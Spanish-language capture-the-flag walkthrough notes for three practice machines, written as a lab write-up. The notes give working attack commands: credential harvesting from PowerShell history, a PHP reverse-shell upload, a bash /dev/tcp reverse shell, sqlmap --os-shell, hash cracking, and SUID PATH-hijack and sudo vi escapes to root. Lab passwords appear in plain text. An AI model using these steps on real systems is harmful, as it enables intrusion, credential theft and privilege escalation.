    SeChangeNotifyPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    !SeImpersonatePrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeCreateGlobalPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeIncreaseWorkingSetPrivilege: DISABLED

Esta linea del output habla sobre el "SeImpersonatePrivilege" que trata del derecho del usuario de "Suplantar al cliente dsps de
la autenticación", es una configuracion de seguridad de windows 2000. De forma predeterminada, a los miembros del grupo de admins
locales del dispositivo y a la cuenta de servicio local del dispositivo se les adigna este derecho.
ESto quiere decir que programas pueden suplantar al usuario u otra cuenta especificada y actuar en nombre del usuario.

Antes que nada podemos fijarnos los dos archivos existentes donde talvez puedan encontrarse las credenciales.
Como es una cuenta normal además de una cuenta de servicio, vale la pena comprobar si hay archivos de acceso frecuente o comandos
ejecutados. 
Para hacer eso podemos leer el archivo de historia de powershell que es el equivalente de .bash_history en linux.
El arhivo ConsoleHost_history.txt puede localizarse en C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\

?PS    cd C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\


?PS    dir

?PS    type ConsoleHost_history.txt

Output:

type ConsoleHost_history.txt
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
exit

Podemos ver que tenemos la contraseña del admin "MEGACORP_4dm1n!!"

Podemos usar la herramienta "psexec.py" otra vez de imapcket examples 


"psexec" es una herramienta de microsoft que nos permite conectarnos de manera remota con las credenciales de un usuario

?$ python3 psexec.py administrator@{target_ip}

?$ password: MEGACORP_4dm1n!!

Acceso completo


! Oopsie 

Siempre que se realice una evaluación web que incluya mecanismos de autenticación hay que revisar cookies, sesiones e intentar 
descubrir como funciona realmente el control de acceso.

Se realiza un escaneo de puertos a la maquina en donde se enumeran el puerto 22 corriendo ssh y el puerto 80 corriendo un servicio
http en apache. 

Nos dirigimos al navegador e introducimos

?$ http://{ip_target}:80

En donde nos encontramos con una app la cual comenzamos a reconocer, vemos que no hay nada por lo que recurrimos a interceptar
con un proxy y burpsuite todo el contenido de la misma, en donde podemos ver un mapeo del sitio en donde salen algunos endpoints
como el que nos llevo a vulnerar la maquina, el cual era:

?$ cdncgi-login 

En el cual habia un login, luego de probar injecciones sqls basicas y varias combinaciones de contraseñas tmb basicas, procedemos
a acceder como invitado, y al pasa unos segundos en la maquina enseguida vemos que en la url, cuando nos muestra la info de nuestro
user guest, aparece

?$ http://...........id=2 

probamos remplazar la id por 1, que siempre suele ser el usuario administrador. Al ingresar el 1 efectivamente no solo es el 
usuario administrador si no que a su vez nos devuelve la id y el nombre del mismo, pudiendo asi remplazar los valores de las
cookies para estar logueado como los mismisimos administradores de la página. Una vez como admin tenemos la opción de subir 
archivos.

Creamos una reverse shell, utilizando las venajas que nos deja parrot, accediendo asi a una copia del archivo alojado en

?$ /usr/share/webshells/php/php-reverse-shell.php

Una vez que tengamos nuestra reverse shell habiendo editado la misma poniendo nuestra direccion ip y un puerto que deseemos, 
procedemos a ponernos en escucha por el mismo con netcat, subimos el archivo y una vez hecho....realizamos un escaneo de paths
con gobuster 

?$ gobuster dir --url http://{ip_target} --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php 

Encontramos que existe el path /uploads, nos dirigimos en la url a el, seguido del nombre con el cual subimos nuestro archivo.
Una vez hecho, Uola! Tenemos conexion...
Para evitar problemas podemos ejecutar el sig comando:

?$ python3 -c 'import pty;pty.spawn("/bin/bash")'

Si realizamos un whoami somos www-data, por lo cauul no tenemos privilegios, toca intentar escalar los mismos.
Recordemos que el sitio web se basa en PHP y SQL, por lo que podemos buscar archivos de estgos lenguajes, buscando asi una posible
mala configuración en el sistema. Luego de varias busquedas nos encontramos con un directorio

?$ /var/www/html/cdncgi/login
bash:
?$ cat * | grep passwd*
zsh:
?$ cat * | grep passwd\*

Al realizar esto tenemos resultados buenos a primer impresión, en los cuales vemos una contraseña 'MEGACORP_4dm1n!!'

Realizamos un vistazo al etc hosts

?$ cat /etc/hosts

En el cual encontramos a un usuario "robert"

Nos intentamos loggear con el mismo

?$ su robert

E ingresamos la contraseña 

?$ Password: 'MEGACORP_4dm1n!!'

Pero...nop. No es correcto.

Por lo que nos decidimos a leer uno a uno los archivos en la carpeta, en donde el 'db.php' contiene otra contraseña 'M3g4C0rpUs3r!'
Por lo que intentamos de vuelta

?$ su robert
?$ Password: 'M3g4C0rpUs3r!'

Podemos optar por un buscar un archivo con privilegios especiales SUID? Si...

?$ id 

De esta manera vemos nuestros grupos e ids.

Por lo que realizamos una busqueda recursiva desde la raiz buscando por nuestro grupo

?$ find / -group bugtracker 2>/dev/null

Encontramos un binario con permisos SUID, el cual al ejecutarlo vemos que lo que hace es un cat a una ruta

Como sabemos los permisos SUID tratan de que por un momento podremos ejecutar el bin como el propietario, el cual en este caso
es root.

Lo que hacemos es editar la variable de entorno del PATH para que asi en lugar de ejecutar un cat, ejecute nuestro archivo cat
el cual tendra de contenido:

?$ /bin/sh

Con esta idea, nos dirigimos al directorio tmp y creamos el mismo, posteriormente le damos permiso de ejcución a otros

?$ chmod +x cat

Posteriormente editamos la variable de entorno del path

?$ export PATH=/tmp:$PATH

Al volver a ejecutar el binario con privilegios SUID obtenemos una shell con los permisos del propietario, root.


! VECCINE 

Luego de un escaneo, vemos que existen los puertos 21, 22 y 80 abiertos, siendo estos FTP, SSH, HTTP. 
Intentamos loggearnos en ftp con el user anonymous y pass anon123.
Descargamos el file backup.zip

Al intentar extraerlo, vemos que tiene una contraseña

Utilizamos la herramienta john para intentar acceder

?$ zip2john backup.zip > hashes

?$ john -w=/u/s/w/rockyou.txt hashes

?$ john --show hashes

Al poder descargar extraer el zip, vemos que existen dos archivos css y php, donde la php se filtra la password, pero esta hasheada,
asi que hay que ver cual es la password, pero para eso primero ver que tipo de hash posee, como la linea del archivo php recibe
una password, la hashea a md5 para posteriormente compararla con el hash que capturamos, tiene sentido utilizar primero este.

?$ hashid {hash}

Esto nos provee una posiblidad de hashes, pero como dijimos anteriormente, primero provaremos con md5

?$ echo {hash} > hash

?$ hashcat -a 0 -m 0 hash /usr/share/wordlist/rockyou.txt

Esta herramienta nos devuelve el hash a texto dado que coincidio con una palabra de lal ista.

Por lo que ahora  podemos loggearnos en la web en el puerto 80, vemos una tabla con una barra de busqueda la cual lo introducido en la misma se envia
al back por query, por lo que al probar poner manualmente una ' vemos que rompe, por lo que es vulnerable a SQL.

Usamos sqlmap:

?$ sqlmap -u http;//{ip}/dashboard.php?search=queryx --cookie="{cookie}"

Una vez realizado el escaneo podemos intentar entablar una reverse shell

?$ sqlmap -u http;//{ip}/dashboard.php?search=queryx --cookie="{cookie}" --os-shell

Una vez obtenido el acceso, vemos que es una consola no muy interactiva, por lo que podriamos mandarnos a algun puerto una shell

?$ bash -c 'bash -i >& /dev/tcp/{our_ip}/{port} 0>&1'

Y hacer un tratamiento de tty 

?$ python3 -c 'import pty;pty.spawn("/bin/bash")'
?$ CTRL+Z
?$ stty raw -echo
?$ fg
?$ export TERM=xterm

Aca investigamos el sistema, encontramos que en un archivo "dashboard.php" se filtra otra contraseña, esta vez en texto claro

La misma intuimos que es del usuario con el cual nos encontramos en la reverse shell, nos conectamos por ssh con dicho usuario 
proporcionando la contraseña encontrada y ahora si, teniendo la password, listamos para ver si poseemos sudoers los cuales ejecutar
(permisos para ejecutar algo como admin)

Vemos que tenemos el editor vi para ejecutar como root, por lo que intentamos ejecutarlo con el sig comando (sacado de gtfobins) 

?$ sudo vi -c ':!/bin/sh' /dev/null

?$  sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf -c ':!/bin/sh'

Nos tira un error, por lo que todabia podemos probar editar un archivo el cual tmb cuenta con el sudoer.

?$  sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf

Una vez abierto el vi, sabemos que con los : podemos ingresar comandos, por lo que ejecutamos

?$ :set shell=/bin/sh

?$ :shell

Y estamos como root.


"""


